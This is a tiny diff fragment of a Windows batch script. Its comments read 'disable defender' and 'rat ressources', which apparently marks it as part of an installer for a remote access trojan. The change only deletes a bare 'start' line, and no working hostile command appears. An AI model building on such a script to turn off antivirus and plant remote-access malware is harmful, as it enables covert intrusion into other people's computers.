@@ -33,7 +33,6 @@ if '%errorlevel%' NEQ '0' (
 
 
 REM disable defender
-start
 
 REM rat ressources
 
